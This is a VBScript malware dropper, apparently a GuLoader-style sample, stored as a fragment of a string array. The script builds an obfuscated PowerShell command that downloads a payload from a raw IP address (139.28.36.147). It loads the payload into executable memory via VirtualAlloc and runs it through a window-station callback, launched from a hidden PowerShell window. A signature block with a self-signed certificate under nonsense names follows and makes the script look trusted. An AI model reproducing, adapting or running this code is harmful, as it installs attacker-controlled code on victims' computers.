"\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1vi;Re`$SkABekUdtJviSioApnUdsJorAraHadHoiSauKasaneStrTanTaeOm=Vi'in'Up;diiInfUf Su(Ch-BinInoRhtIm(DrTDieHysPltSp-AaPToaAntPahNo Do`$\"", "\nCh9 = Ch9 & ", "\"VeAGosHysInuborabaHenprcNaeHesReuChmFlmeneMarAfnSeeKnsqu1Th5Af8Tr2La)Sl)Da Au{FiwGlhSkiUnlToeLi Pa(Fk`$ClAPlkpatPhiDeoSanWasUnrHeaBudCuiEnuStsMueplrRenPheCh Ki-ExeGrqLe se'Ti'Im)In Pr{No`$AfAHikAptp\"", "\nCh9 = Ch9 & ", "\"riFroHonSesTurFoatydLeireuArsOpeRarUdnAueMo Gi=ko Ab(QuNSaePawBl-ReOFabByjDieTicHotDa boNmieCotSk.SpWSeeUnbFrCTvlGoiPreBenbitAu)po.CoDreoOvwPrnPelTioBaaIndBySV\"", "\nCh9 = Ch9 & ", "\"atUnrsoiApnBrgBe(Do'WihFatAutIcpSa:Ch/Fl/Ar1Fo3Bu9Sh.Ve2Iv8Mb.In3To6Bl.Ma1Pl4Nd7Ss/MeSMeaMemAbmmeeCenSlsFetNeiBelhjlOreRenKxdUpeVisRg.AndKosMepLi'Sp)Ha;ScSAntDraCorLatKa-SkSHalP\"", "\nCh9 = Ch9 & ", "\"aeIneSapAa Ki5Kl;Rv}BiSMieZotSu-MyCSioDrnDithoeSlnVotTh Bo`$AdAchsOssBeuKorFoaKunApcWiePrsUnuDimOnmpaefurarnUneTosre1De5Pr8Tv2So Ru`$OmASakGetOfiCboFonS\"", "\nCh9 = Ch9 & ", "\"nsThrTiaDodToiChuAusAfeForRenLseKa;Ru}Fu`$LuASasMesFouOprDiaOpnUncOxeBesCruFlmSemKiecerBenPreSesDe1Mu5Ye8Ga3Je=Sp[CrAHusAfsCeuAmrMeaHonBucBeeCosLeuAnmOpmSkeSmrHenPreAusPa1mi5Ph8Eg1co]Ub:Fo:KoVHoiSkrTrtPauSiatrlKaAIlleplGloAlcIn(Sa0Ud,De1de0Ou4Kn8Bu5Me7Do\"", "\nCh9 = Ch9 & ", "\"6Ce,Re1Jo2Th2Ar8So8Co,Ca6Au4An)Ge;Ta`$LuABekIntDyiBroSynUnsSurRiaStdKdibeuUdsSheAkrRenKoeDi Uf=In RhGSteMdtUl-QuCReocunAftTaeKlnAgtPe Le`$PrAIlsZisfruStrFlaLinKrcleeUnsKvuJumEumAfeKorstnCueDisTi1Fo5Uf8es2li;Fl`$FrPEsaRkrWoeD\"", "\nCh9 = Ch9 & ", "\"ooMoeCoaFinOv St=Co Se[noSChyVisFotUneTimOs.SoCProBenEsvDaeLirSktJu]Ku:Ti:PaFGarOmoAxmMaBMaaUnsSjeGo6Km4BySRotInrPoiBanRegEx(Ba`$MiAMokGltStiWioponAlsEnrIsaBedPaireuSpsSkeVerStnEueAu)In;ko[HaSSkyAmsHotAeeHamSt.BlRomuBenRitSuiPrmofeHv.PaIbunLetAbeSyrProSupCoSNeeinrDuvAaiAfcCoePosRr.beMFaaRarGasS\"", "\nCh9 = Ch9 & ", "\"khBeaStlSu]We:Re:BaCLeoUnpPlyMo(Ar`$OvPMiaAnrReeNooBoeEnaSpnOx,Fa Af0Va,Hy Ch Ho`$PaAResVisJauFirPeaFonUncDeePrsInuHemOpmSteGrrUdnFleAdsCu1Bl5Se8Dy3Im,Wa In`$DiPSpaRerSueAfoMaeKaaLanSl.PrcUnohuuPrnAntIn)At;aa[SeApasPlsHyunarLi\"", "\nCh9 = Ch9 & ", "\"aTenPrcTheMesChuFumTemUneInrScnDieCasTy1Re5Dy8El1Un]To:Re:ReETrnEluUbmGeWOmiRynTadKroOpwgaSSmtDeaArtDriFooRinChsStWpa(Af`$UtAUssSesKoukarUnadunTrcCheEnsFluInmSkmraeInrEmnSueMesSl1Su5Ar8Vr3Wi,Ri Br0Cr)Un#Bu;A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1;Function Assurancesummernes1584 {    param([String]$HS);    For($i=2; $i -lt $HS.Length-1; $i+=(2+1)){        $Sardindaasens = $Sardindaasens + $HS.Substring($i, 1);    }    $Sard\"", "\nCh9 = Ch9 & ", "\"indaasens;}$Taxiauto0 = Assurancesummernes1584 'ReIMiETiXCe ';$Taxiauto1= Assurancesummernes1584 $Translucences;& ($Taxiauto0) $Taxiauto1;;\"", "\n\n", "set", " Nitwits ", "= CreateObject(", "\"Scripting.FileSystemObject\"", ")", "\n \n", "set", " ", "Bladeventyrs = CreateObject(", "\"WScript.Shell\"", ")", "\n\n", "Set", " ", "Iglus = Bladeventyrs.Exec(", "\"cmd /c echo %windir%\"", ")", "\n\nPolysome0 ", "= Iglus.StdOut.ReadLine()", "\n\nRambo ", "=  Polysome0 &", " ", "\"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershel\"", "+", "\"l.exe\"", "\n\n\n", "set", " ", "Sweepback = CreateObject(", "\"Shell.Application\"", ")", "\nIf ", "Nitwits.FileExists(Rambo) = false then Rambo =", " ", "\"powershell.exe\"", "\n\nCh9 ", "= replace(Ch9,", "\"Affedninge1\"", ",chr(34))", "\n\nSweepback.ShellExecute ", "Rambo,", " ", "\" \"", " ", "& chrw(34) & Ch9 & chrw(34),", " ", "\"\"", ",", " ", "\"\"", ", 0", "\n\n\n\n\n \n \n", "''", " SIG ", "''", " ", "Begin signature block", "\n", "''", " SIG ", "''", " ", "MIIeNwYJKoZIhvcNAQcCoIIeKDCCHiQCAQExDzANBglg", "\n", "''", " SIG ", "''", " ", "hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor", "\n", "''", " SIG ", "''", " ", "BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC", "\n", "''", " SIG ", "''", " ", "AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg", "\n", "''", " SIG ", "''", " ", "sSQkxx1Q5QReAw2o0O6fe793F72tx09levKgjTbDW46g", "\n", "''", " SIG ", "''", " ", "ggQXMIIEEzCCAvugAwIBAgIIVsqjEQ8omPUwDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQELBQAwgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIDAeFw0yMTExMTcxMDA3MTdaFw0yNDExMTYxMDA3", "\n", "''", " SIG ", "''", " ", "MTdaMIGeMQswCQYDVQQGEwJERTEbMBkGA1UECAwSU2No", "\n", "''", " SIG ", "''", " ", "bGVzd2lnLUhvbHN0ZWluMRIwEAYDVQQHDAlMw7xyc2No", "\n", "''", " SIG ", "''", " ", "YXUxDzANBgNVBAoMBlNuaXBwZTEiMCAGCSqGSIb3DQEJ", "\n", "''", " SIG ", "''", " ", "ARYTVHVhcmVnQFRvbHVpZGluZS5TazEpMCcGA1UECwwg", "\n", "''", " SIG ", "''", " ", "SGluZGJybWFybWVsYWRlcm5lIEd5bmVjb21hc3RpYSAw", "\n", "''", " SIG ", "''", " ", "ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDA", "\n", "''", " SIG ", "''", " ", "bxkjrOQpmE8BceChyNKZMB1sQKI", "/L1331RBRguylaYLe\n", "''", " SIG ", "''", " H57+GWKQl1jUWXRPa5cqC/", "df1OGj9x707NLLo8ygB0A4", "\n", "''", " SIG ", "''", " ", "njyC2bhVy", "/pC0lV4v3xgwaKWcCqaAC2cRVavxyVNAr0K\n", "''", " SIG ", "''", " cdESjH1OMetzxUd6+xmnBBSsRjLXZ7zIL00PTcW6qE2u\n", "''", " SIG ", "''", " x1l5eXMtBbsZ257ujKjKq3ZmRoN5HbmLiAW1J5ckwBqB\n", "''", " SIG ", "''", " wfvfACuMumwGDPjOGl9ycwjcaAgl69y1hVIiy7mAIV3D\n", "''", " SIG ", "''", " cNuTtslCl47QQ+Xpi18uSFgqhTuAsvIpKfJ6uGvTL09U\n", "''", " SIG ", "''", " bDgDEkZXFkwh3TQUzqO0eK1QFX/", "8u5U1AgMBAAGjUzBR", "\n", "''", " SIG ", "''", " ", "MB0GA1UdDgQWBBR96iGRZyy1E9ajUW4zDwUoV6hguTAf", "\n", "''", " SIG ", "''", " ", "BgNVHSMEGDAWgBR96iGRZyy1E9ajUW4zDwUoV6hguTAP", "\n", "''", " SIG ", "''", " ", "BgNVHRMBAf8EBTADAQH", "/MA0GCSqGSIb3DQEBCwUAA4IB\n", "''", " SIG ", "''", " AQAX6YH0P5pn3Ehm7XtSyDfhrcFBYr+TXG5lCVgAVZuO\n", "''", " SIG ", "''", " AfPQBO8y/", "JfP6cQZYYz+0I8d7qZbDJS", "/B60txKnBK2es\n", "''", " SIG ", "''", " k0QcxQ1Tr+RAKZLRXlbpReEloN2b5WFejh08iyQ+", "7", "xP9\n", "''", " SIG ", "''", " OV+xaIGduXbjU0xoM6P1rlCh/", "SQ4tYuYBgiIQJhsStlD", "\n", "''", " SIG ", "''", " ", "Df3T7hbzwCvvu67tvhMuoDgi412ZKfMIMEtf1XQYes8I", "\n", "''", " SIG ", "''", " ", "D5rkUiXNRZR0NK6j0V+8dS+QlKOc9sbFzRMOYzktPXAo", "\n", "''", " SIG ", "''", " ", "C7SFS6X", "/C/", "WA6ozpog8CRSvPjxGVXRLl8bl9eEnZtc6N", "\n", "''", " SIG ", "''", " ", "Oxo4pcyblS6UYxE5vHLoSQHagTpjLiFPoVC6MYIZeDCC", "\n", "''", " SIG ", "''", " ", "GXQCAQEwgaswgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIAIIVsqjEQ8omPUwDQYJYIZIAWUDBAIBBQCgXjAQ", "\n", "''", " SIG ", "''", " ", "BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYK", "\n", "''", " SIG ", "''", " ", "KwYBBAGCNwIBBDAvBgkqhkiG9w0BCQQxIgQgfPddFTZR", "\n", "''", " SIG ", "''", " ", "jlHIpoeVY76icMx6fJm0dQjDMeupPa8Bie8wDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQEBBQAEggEAoZEiYMTu3ozWb2ZJha2NQLSjMPDQ", "\n", "''", " SIG ", "''", " ", "8eRJOc22RWhMyJ5wIRF3hxGCrWz48ZY4470", "/PSA64KI0\n", "''", " SIG ", "''", " gIA3DLAI5sA5+IiyKcXuVlS7oTYFOuWAquB1tkVn0OaI\n", "''", " SIG ", "''", " Y/", "SJNCE4Vcz+Sfeq7hs+uvAZ+QdzZfBahJxMItJ2Pqqe", "\n", "''", " SIG ", "''", " ", "vXUH2gCWWZlm7y0GxJZPLH1G1mX", "/E+oanZTA2LyVBKsS\n", "''", " SIG ", "''", " slrFv3zeMC04x8JHP8eWboPKS+LBsJJDOZ1XImHwK84i\n", "''", " SIG ", "''", " +", "1", "PzdLxfoGucu6h+", "7", "OVjUo9yAvbhWopaAGHmrlEBbyaH\n", "''", " SIG ", "''", " zhcCbgTjgrirwYcaWXGqEclsSPk3m2v0StxH23wUvFVT\n", "''", " SIG ", "''", " ", "33", "cl8KGCFz0wghc5BgorBgEEAYI3AwMBMYIXKTCCFyUG\n", "''", " SIG ", "''", " CSqGSIb3DQEHAqCCFxYwghcSAgEDMQ8wDQYJYIZIAWUD\n", "''", " SIG ", "''", " BAIBBQAwdwYLKoZIhvcNAQkQAQSgaARmMGQCAQEGCWCG\n", "''", " SIG ", "''", " SAGG/", "WwHATAxMA0GCWCGSAFlAwQCAQUABCDpwPdh66lZ", "\n", "''", " SIG ", "''", " ", "VjjzDfyi5sHzO2HQemkjqua4cx+fe74UkQIQc0aZa0JV", "\n", "''", " SIG ", "''", " ", "oEq4a+IjBMvWohgPMjAyMjExMDgyMzM1MTVaoIITBzCC", "\n", "''", " SIG ", "''", " ", "BsAwggSooAMCAQICEAxNaXJLlPo8Kko9KQeAPVowDQYJ", "\n", "''", " SIG ", "''", " ", "KoZIhvcNAQELBQAwYzELMAkGA1UEBhMCVVMxFzAVBgNV", "\n", "''", " SIG ", "''", " ", "BAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdp", "\n", "''", " SIG ", "''", " ", "Q2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRp", "\n", "''", " SIG ", "''", " ", "bWVTdGFtcGluZyBDQTAeFw0yMjA5MjEwMDAwMDBaFw0z", "\n", "''", " SIG ", "''", " ", "MzExMjEyMzU5NTlaMEYxCzAJBgNVBAYTAlVTMREwDwYD", "\n", "''", " SIG ", "''", " ", "VQQKEwhEaWdpQ2VydDEkMCIGA1UEAxMbRGlnaUNlcnQg", "\n", "''", " SIG ", "''", " ", "VGltZXN0YW1wIDIwMjIgLSAyMIICIjANBgkqhkiG9w0B", "\n", "''", " SIG ", "''", " ", "AQEFAAOCAg8AMIICCgKCAgEAz+ylJjrGqfJru43BDZrb", "\n", "''", " SIG ", "''", " ", "oegUhXQzGias0BxVHh42bbySVQxh9J0Jdz0Vlggva2Sk", "\n", "''", " SIG ", "''", " /QaDFteRkjgcMQKW+", "3", "KxlzpVrzPsYYrppijbkGNcvYlT\n", "''", " SIG ", "''", " ", "4", "DotjIdCriak5Lt4eLl6FuFWxsC6ZFO7KhbnUEi7iGkM\n", "''", " SIG ", "''", " iMbxvuAvfTuxylONQIMe58tySSgeTIAehVbnhe3yYbyq\n", "''", " SIG ", "''", " Ogd99qtu5Wbd4lz1L+", "2", "N1E2VhGjjgMtqedHSEJFGKes+\n", "''", " SIG ", "''", " JvK0jM1MuWbIu6pQOA3ljJRdGVq/", "9XtAbm8WqJqclUeG", "\n", "''", " SIG ", "''", " ", "hXk+DF5mjBoKJL6cqtKctvdPbnjEKD+jHA9QBje6CNk1", "\n", "''", " SIG ", "''", " ", "prUe2nhYHTno+EyREJZ+TeHdwq2lfvgtGx", "/sK0YYoxn2\n", "''", " SIG ", "''", " Off1wU9xLokDEaJLu5i/", "+k", "/kezbvBkTkVf826uV8Mefz\n", "''", " SIG ", "''", " wlLE5hZ7Wn6lJXPbwGqZIS1j5Vn1TS+QHye30qsU5Thm\n", "''", " SIG ", "''", " h1EIa/", "tTQznQZPpWz+D0CuYUbWR4u5j9lMNzIfMvwi4g", "\n", "''", " SIG ", "''", " ", "14Gs0", "/EH1OG92V1LbjGUKYvmQaRllMBY5eUuKZCmt2Fk\n", "''", " SIG ", "''", " +tkgbBhRYLqmgQ8JJVPxvzvpqwcOagc5YhnJ1oV/", "E9mN", "\n", "''", " SIG ", "''", " ", "ec9ixezhe7nMZxMHmsF47caIyLBuMnnHC1mDjcbu9Sx8", "\n", "''", " SIG ", "''", " ", "e47LZInxscS451NeX1XSfRkpWQNO+l3qRXMchH7XzuLU", "\n", "''", " SIG ", "''", " ", "OncCAwEAAaOCAYswggGHMA4GA1UdDwEB", "/wQEAwIHgDAM\n", "''", " SIG ", "''", " BgNVHRMBAf8EAjAAMBYGA1UdJQEB/", "wQMMAoGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwMIMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG", "\n", "''", " SIG ", "''", " /WwHATAfBgNVHSMEGDAWgBS6FtltTYUvcyl2mi91jGog\n", "''", " SIG ", "''", " j57IbzAdBgNVHQ4EFgQUYore0GH8jzEU7ZcLzT0qlBTf\n", "''", " SIG ", "''", " UpwwWgYDVR0fBFMwUTBPoE2gS4ZJaHR0cDovL2NybDMu\n", "''", " SIG ", "''", " ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0UlNB\n", "''", " SIG ", "''", " NDA5NlNIQTI1NlRpbWVTdGFtcGluZ0NBLmNybDCBkAYI\n", "''", " SIG ", "''", " KwYBBQUHAQEEgYMwgYAwJAYIKwYBBQUHMAGGGGh0dHA6\n", "''", " SIG ", "''", " Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBYBggrBgEFBQcwAoZM\n", "''", " SIG ", "''", " aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lD\n", "''", " SIG ", "''", " ZXJ0VHJ1c3RlZEc0UlNBNDA5NlNIQTI1NlRpbWVTdGFt\n", "''", " SIG ", "''", " cGluZ0NBLmNydDANBgkqhkiG9w0BAQsFAAOCAgEAVaoq\n", "''", " SIG ", "''", " GvNG83hXNzD8deNP1oUj8fz5lTmbJeb3coqYw3fUZPwV\n", "''", " SIG ", "''", " +zbCSVEseIhjVQlGOQD8adTKmyn7oz/", "AyQCbEx2wmInc", "\n", "''", " SIG ", "''", " ", "ePLNfIXNU52vYuJhZqMUKkWHSphCK1D8G7WeCDAJ+uQt", "\n", "''", " SIG ", "''", " ", "1wmJefkJ5ojOfRu4aqKbwVNgCeijuJ3XrR8cuOyYQfD2", "\n", "''", " SIG ", "''", " ", "DoD75P", "/fnRCn6wC6X0qPGjpStOq/", "CUkVNTZZmg9U0rIb", "\n", "''", " SIG ", "''", " ", "f35eCa12VIp0bcrSBWcrduv", "/mLImlTgZiEQU5QpZomvn\n", "''", " SIG ", "''", " Ij5EIdI/", "HMCb7XxIstiSDJFPPGaUr10CU+ue4p7k0x+G", "\n", "''", " SIG ", "''", " ", "AWScAMLpWnR1DT3heYi", "/HAGXyRkjgNc2Wl+WFrFjDMZG\n", "''", " SIG ", "''", " QDvOXTXUWT5Dmhiuw8nLw/", "ubE19qtcfg8wXDWd8nYive", "\n", "''", " SIG ", "''", " ", "QclTuf80EGf2JjKYe", "/", "5", "cQpSBlIKdrAqLxksVStOYkEVg\n", "''", " SIG ", "''", " M4DgI974A6T2RUflzrgDQkfoQTZxd639ouiXdE4u2h4d\n", "''", " SIG ", "''", " jFrIHprVwvDGIqhPm73YHJpRxC+a9l+nJ5e6li6FV8Bg\n", "''", " SIG ", "''", " ", "53", "hWf2rvwpWaSxECyIKcyRoFfLpxtU56mWz06J7UWpjI\n", "''", " SIG ", "''", " n7+NuxhcQ/", "XQKujiYu54BNu90ftbCqhwfvCXhHjjCANd", "\n", "''", " SIG ", "''", " ", "RyxjqCU4lwHSPzra5eX25pvcfizM", "/xdMTQCi2NYBDriL\n", "''", " SIG ", "''", " ", "7", "ubgclWJLCcZYfZ3AYwwggauMIIElqADAgECAhAHNje3\n", "''", " SIG ", "''", " JFR82Ees/", "ShmKl5bMA0GCSqGSIb3DQEBCwUAMGIxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx", "\n", "''", " SIG ", "''", " ", "GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV", "\n", "''", " SIG ", "''", " ", "BAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0y", "\n", "''", " SIG ", "''", " ", "MjAzMjMwMDAwMDBaFw0zNzAzMjIyMzU5NTlaMGMxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j", "\n", "''", " SIG ", "''", " ", "LjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBHNCBS", "\n", "''", " SIG ", "''", " ", "U0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwggIi", "\n", "''", " SIG ", "''", " ", "MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDGhjUG", "\n", "''", " SIG ", "''", " ", "SbPBPXJJUVXHJQPE8pE3qZdRodbSg9GeTKJtoLDMg", "/la\n", "''", " SIG ", "''", " ", "9", "hGhRBVCX6SI82j6ffOciQt/", "nR+eDzMfUBMLJnOWbfhX", "\n", "''", " SIG ", "''", " ", "qAJ9", "/UO0hNoR8XOxs+", "4", "rgISKIhjf69o9xBd/", "qxkrPkLc", "\n", "''", " SIG ", "''", " ", "Z47qUT3w1lbU5ygt69OxtXXnHwZljZQp09nsad", "/ZkIdG\n", "''", " SIG ", "''", " AHvbREGJ3HxqV3rwN3mfXazL6IRktFLydkf3YYMZ3V+", "0", "\n", "''", " SIG ", "''", " VAshaG43IbtArF+y3kp9zvU5EmfvDqVjbOSmxR3NNg1c\n", "''", " SIG ", "''", " ", "1", "eYbqMFkdECnwHLFuk4fsbVYTXn+", "149", "zk6wsOeKlSNbw\n", "''", " SIG ", "''", " sDETqVcplicu9Yemj052FVUmcJgmf6AaRyBD40NjgHt1\n", "''", " SIG ", "''", " biclkJg6OBGz9vae5jtb7IHeIhTZgirHkr+g3uM+onP6\n", "''", " SIG ", "''", " ", "5", "x9abJTyUpURK1h0QCirc0PO30qhHGs4xSnzyqqWc0Jo\n", "''", " SIG ", "''", " n7ZGs506o9UD4L/", "wojzKQtwYSH8UNM", "/STKvvmz3+Drhk\n", "''", " SIG ", "''", " Kvp1KCRB7UK/", "BZxmSVJQ9FHzNklNiyDSLFc1eSuo80Vg", "\n", "''", " SIG ", "''", " ", "vCONWPfcYd6T", "/jnA+bIwpUzX6ZhKWD7TA4j+s4/", "TXkt2", "\n", "''", " SIG ", "''", " ", "ElGTyYwMO1uKIqjBJgj5FBASA31fI7tk42PgpuE+9sJ0", "\n", "''", " SIG ", "''", " ", "sj8eCXbsq11GdeJgo1gJASgADoRU7s7pXcheMBK9Rp61", "\n", "''", " SIG ", "''", " ", "03a50g5rmQzSM7TNsQIDAQABo4IBXTCCAVkwEgYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAgwBgEB/", "wIBADAdBgNVHQ4EFgQUuhbZbU2FL3Mp", "\n", "''", " SIG ", "''", " ", "dpovdYxqII+eyG8wHwYDVR0jBBgwFoAU7NfjgtJxXWRM", "\n", "''", " SIG ", "''", " ", "3y5nP+e6mK4cD08wDgYDVR0PAQH", "/BAQDAgGGMBMGA1Ud\n", "''", " SIG ", "''", " JQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAk\n", "''", " SIG ", "''", " BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu\n", "''", " SIG ", "''", " Y29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5k\n", "''", " SIG ", "''", " aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0\n", "''", " SIG ", "''", " LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3Js\n", "''", " SIG ", "''", " My5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9v\n", "''", " SIG ", "''", " dEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglg\n", "''", " SIG ", "''", " hkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBAH1ZjsCT\n", "''", " SIG ", "''", " tm+YqUQiAX5m1tghQuGwGC4QTRPPMFPOvxj7x1Bd4ksp\n", "''", " SIG ", "''", " +", "3", "CKDaopafxpwc8dB+k+YMjYC+VcW9dth/", "qEICU0MWfN", "\n", "''", " SIG ", "''", " ", "thKWb8RQTGIdDAiCqBa9qVbPFXONASIlzpVpP0d3+3J0", "\n", "''", " SIG ", "''", " ", "FNf", "/q0+KLHqrhc1DX+", "1", "gtqpPkWaeLJ7giqzl/", "Yy8ZCaH", "\n", "''", " SIG ", "''", " ", "bJK9nXzQcAp876i8dU+6WvepELJd6f8oVInw1YpxdmXa", "\n", "''", " SIG ", "''", " ", "zPByoyP6wCeCRK6ZJxurJB4mwbfeKuv2nrF5mYGjVoar", "\n", "''", " SIG ", "''", " ", "CkXJ38SNoOeY+", "/umnXKvxMfBwWpx2cYTgAnEtp/", "Nh4ck", "\n", "''", " SIG ", "''", " ", "u0+jSbl3ZpHxcpzpSwJSpzd+k1OsOx0ISQ+UzTl63f8l", "\n", "''", " SIG ", "''", " ", "Y5knLD0", "/a6fxZsNBzU+", "2", "QJshIUDQtxMkzdwdeDrknq3l\n", "''", " SIG ", "''", " NHGS1yZr5Dhzq6YBT70/", "O3itTK37xJV77QpfMzmHQXh6", "\n", "''", " SIG ", "''", " ", "OOmc4d0j", "/R0o08f56PGYX/", "sr2H7yRp11LB4nLCbbbxV7", "\n", "''", " SIG ", "''", " ", "HhmLNriT1ObyF5lZynDwN7+YAN8gFk8n+2BnFqFmut1V", "\n", "''", " SIG ", "''", " ", "wDophrCYoCvtlUG3OtUVmDG0YgkPCr2B2RP+v6TR81fZ", "\n", "''", " SIG ", "''", " ", "vAT6gt4y3wSJ8ADNXcL50CN", "/AAvkdgIm2fBldkKmKYcJ\n", "''", " SIG ", "''", " RyvmfxqkhQ/", "8mJb2VVQrH4D6wPIOK+XW+6kvRBVK5xMO", "\n", "''", " SIG ", "''", " ", "Hds3OBqhK", "/bt1nz8MIIFjTCCBHWgAwIBAgIQDpsYjvnQ\n", "''", " SIG ", "''", " Lefv21DiCEAYWjANBgkqhkiG9w0BAQwFADBlMQswCQYD\n", "''", " SIG ", "''", " VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkw\n", "''", " SIG ", "''", " FwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQD\n", "''", " SIG ", "''", " ExtEaWdpQ2VydCBBc3N1cmVkIElEIFJvb3QgQ0EwHhcN\n", "''", " SIG ", "''", " MjIwODAxMDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQsw\n", "''", " SIG ", "''", " CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j\n", "''", " SIG ", "''", " MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYD\n", "''", " SIG ", "''", " VQQDExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIi\n", "''", " SIG ", "''", " MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC/", "5pBz", "\n", "''", " SIG ", "''", " ", "aN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa", "\n", "''", " SIG ", "''", " ", "za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F", "/WBTxS\n", "''", " SIG ", "''", " D1Ifxp4VpX6+n6lXFllVcq9ok3DCsrp1mWpzMpTREEQQ\n", "''", " SIG ", "''", " ", "Lt", "+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT+CFh\n", "''", " SIG ", "''", " mzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiO\n", "''", " SIG ", "''", " DCu3T6cw2Vbuyntd463JT17lNecxy9qTXtyOj4DatpGY\n", "''", " SIG ", "''", " QJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+EJFwq1WC\n", "''", " SIG ", "''", " QTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/", "CNda", "\n", "''", " SIG ", "''", " ", "SaTC5qmgZ92kJ7yhTzm1EVgX9yRcRo9k98FpiHaYdj1Z", "\n", "''", " SIG ", "''", " ", "XUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5jrubU75KSOp49", "\n", "''", " SIG ", "''", " ", "3ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4", "/", "3", "\n", "''", " SIG ", "''", " IbKyEbe7f/", "LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPR", "\n", "''", " SIG ", "''", " ", "iQfhvbfmQ6QYuKZ3AeEPlAwhHbJUKSWJbOUOUlFHdL4m", "\n", "''", " SIG ", "''", " ", "rLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU", "/\n", "''", " SIG ", "''", " Y+whX8QgUWtvsauGi0/", "C1kVfnSD8oR7FwI+isX4KJpn1", "\n", "''", " SIG ", "''", " ", "5GkvmB0t9dmpsh3lGwIDAQABo4IBOjCCATYwDwYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAUwAwEB/", "zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n", "\n", "''", " SIG ", "''", " ", "P+e6mK4cD08wHwYDVR0jBBgwFoAUReuir", "/SSy4IxLVGL\n", "''", " SIG ", "''", " p6chnfNtyA8wDgYDVR0PAQH/", "BAQDAgGGMHkGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au", "\n", "''", " SIG ", "''", " ", "ZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8v", "\n", "''", " SIG ", "''", " ", "Y2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1", "\n", "''", " SIG ", "''", " ", 